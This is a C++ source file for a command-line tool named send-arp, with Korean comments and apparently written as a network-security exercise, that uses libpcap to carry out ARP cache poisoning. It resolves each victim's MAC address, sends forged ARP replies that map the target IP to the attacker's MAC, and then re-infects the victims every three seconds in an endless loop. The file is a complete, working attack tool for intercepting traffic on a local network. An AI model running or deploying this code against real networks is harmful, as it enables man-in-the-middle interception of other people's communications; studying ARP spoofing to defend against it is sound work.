#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <pcap.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"

#define MAX_TARGETS 32
#define ARP_REQUEST_RETRY 5     // 재시도 횟수 
#define ARP_REPLY_WAIT_MAX 100  // 한 번 요청 후 최대 몇 개 패킷까지 확인할지
#define ARP_INFECTION_REPEAT 3  // infection 패킷 몇 번 반복 전송할지

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct SenderTarget {
	Ip senderIp;
	Mac senderMac;
	Ip targetIp;
};

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 \n");
}

// 인터페이스 ->  MAC 주소
Mac getMyMac(const char* dev) {
	struct ifreq ifr;

	//소켓생성 
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

	// mac 받기
	ioctl(fd, SIOCGIFHWADDR, &ifr);
	close(fd);

	uint8_t* macBytes = (uint8_t*)ifr.ifr_hwaddr.sa_data;
	return Mac(macBytes);
}

// 인터페이스 ->  IP 주소
Ip getMyIp(const char* dev) {
	struct ifreq ifr;

	// 소켓생성
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

	// ip 받기
	ioctl(fd, SIOCGIFADDR, &ifr);
	close(fd);

	// 캐스팅하고 네트워크 바이트 -> 호스트바이트 변환
	struct sockaddr_in* addr = (struct sockaddr_in*)&ifr.ifr_addr;
	uint32_t ipValue = ntohl(addr->sin_addr.s_addr);
	return Ip(ipValue);
}

bool sendPacket(pcap_t* pcap, EthArpPacket* pkt) {
	// 패킷 전송  pcap_sendpacket(인터페이스, 바이트 배열 , 크기)
	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(pkt), sizeof(EthArpPacket));
	
	// 에러 처리 
	if (res != 0) {
		fprintf(stderr, "[-] pcap_sendpacket error=%s\n", pcap_geterr(pcap));
		return false;
	}
	return true;
}

// senderIp에게 정상적인 ARP request를 보냄
//ARP reply에서 sender의 MAC 알아오기
Mac getSenderMac(pcap_t* pcap, Mac myMac, Ip myIp, Ip senderIp) {
	EthArpPacket request;

	// ARP 요청 패킷
	request.eth_.dmac_ = Mac::broadcastMac();  // 브로드캐스트
	request.eth_.smac_ = myMac;
	request.eth_.type_ = htons(EthHdr::Arp); //네트워크 바이트 순서로 변경

	request.arp_.hrd_ = htons(ArpHdr::ETHER);
	request.arp_.pro_ = htons(EthHdr::Ip4);
	request.arp_.hln_ = Mac::Size;
	request.arp_.pln_ = Ip::Size;
	request.arp_.op_ = htons(ArpHdr::Request);
	request.arp_.smac_ = myMac;
	request.arp_.sip_ = htonl(myIp);
	request.arp_.tmac_ = Mac::nullMac();  // 아직 sender mac을 모르니 비워둠
	request.arp_.tip_ = htonl(senderIp);

	// 재시도 횟수 만큼 arp 요청 전송 
	for (int attempt = 0; attempt < ARP_REQUEST_RETRY; attempt++) {
		if (!sendPacket(pcap, &request)) continue;

		for (int i = 0; i < ARP_REPLY_WAIT_MAX; i++) {
			struct pcap_pkthdr* header;
			const u_char* recvBuf;

			// 네트워크 카드에 잡히는 패킷 가져오기 
			int ret = pcap_next_ex(pcap, &header, &recvBuf);
			if (ret != 1) continue;  // 타임아웃/에러면 다음 패킷으로

			// 익숙한 형태로 분해해서 읽음 
			EthHdr* recvEth = (EthHdr*)recvBuf;
			if (recvEth->type() != EthHdr::Arp) continue;

			ArpHdr* recvArp = (ArpHdr*)(recvBuf + sizeof(EthHdr));
			if (recvArp->op() != ArpHdr::Reply) continue;
			if (recvArp->sip() != senderIp) continue;  // 내가 물어본 IP의 답인지 확인

			return recvArp->smac();
		}
	}

	fprintf(stderr, "[-] failed to get sender(%s) mac\n", std::string(senderIp).c_str());
	return Mac::nullMac();
}

// sender에게 거짓 ARP reply를 보내 ARP table을 오염
void sendArpInfection(pcap_t* pcap, Mac myMac, Mac senderMac, Ip senderIp, Ip targetIp) {
	EthArpPacket infect;

	infect.eth_.dmac_ = senderMac;  // sender에게만 보냄 (유니캐스트) 
	infect.eth_.smac_ = myMac;
	infect.eth_.type_ = htons(EthHdr::Arp);

	infect.arp_.hrd_ = htons(ArpHdr::ETHER);
	infect.arp_.pro_ = htons(EthHdr::Ip4);
	infect.arp_.hln_ = Mac::Size;
	infect.arp_.pln_ = Ip::Size;
	infect.arp_.op_ = htons(ArpHdr::Reply);

	// targetIp의 attacker라고 응답
	infect.arp_.smac_ = myMac;
	infect.arp_.sip_ = htonl(targetIp);

	// 진짜 목적지 정보
	infect.arp_.tmac_ = senderMac;
	infect.arp_.tip_ = htonl(senderIp);

	// 패킷이 유실될수 있으니까 여러번 보냄
	for (int i = 0; i < ARP_INFECTION_REPEAT; i++) {
		sendPacket(pcap, &infect);
		usleep(100 * 1000);  // 100ms
	}
}

// argv를 파싱해서 SenderTarget 배열을 채우고, 몇 쌍인지 반환
int parseTargets(int argc, char* argv[], SenderTarget targets[]) {
    int targetCount = 0;
    for (int i = 2; i < argc; i += 2) {
        targets[targetCount].senderIp = Ip(argv[i]);
        targets[targetCount].targetIp = Ip(argv[i + 1]);
        targetCount++;
    }
    return targetCount;
}

int main(int argc, char* argv[]) {
	if (argc < 4 || (argc - 2) % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];

	SenderTarget targets[MAX_TARGETS];
	int targetCount = parseTargets(argc, argv, targets);

	//패킷 송수신용 pcap 핸들열기 
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	// 내 정보 (mac , ip) 알아오기
	Mac myMac = getMyMac(dev);
	Ip myIp = getMyIp(dev);
	printf("[+] my mac: %s\n", std::string(myMac).c_str());
	printf("[+] my ip : %s\n", std::string(myIp).c_str());

	// 모든 sender의 진짜 mac을 먼저 알아오기
	for (int i = 0; i < targetCount; i++) {
		printf("[*] resolving sender mac for %s ...\n", std::string(targets[i].senderIp).c_str());
		targets[i].senderMac = getSenderMac(pcap, myMac, myIp, targets[i].senderIp);
		
		if (targets[i].senderMac.isNull()) {
			printf("[-] failed, skip this pair\n");
			continue;
		}

		// sender와 target 정보 출력
		printf("[+] sender %s -> mac %s\n",
			std::string(targets[i].senderIp).c_str(),
			std::string(targets[i].senderMac).c_str());
	}

	// arp 테이블 오염시키기
	for (int i = 0; i < targetCount; i++) {
		if (targets[i].senderMac.isNull()) continue;
		sendArpInfection(pcap, myMac, targets[i].senderMac, targets[i].senderIp, targets[i].targetIp);
		printf("[+] infection sent: sender=%s target=%s\n",
			std::string(targets[i].senderIp).c_str(),
			std::string(targets[i].targetIp).c_str());
	}

	// sender의 ARP table이 다시 정상으로 복구되지 않도록 주기적으로 재감염
	while (true) {
		sleep(3);
		for (int i = 0; i < targetCount; i++) {
			if (targets[i].senderMac.isNull()) continue;
			sendArpInfection(pcap, myMac, targets[i].senderMac, targets[i].senderIp, targets[i].targetIp);
		}
	}

	pcap_close(pcap);
	return 0;
}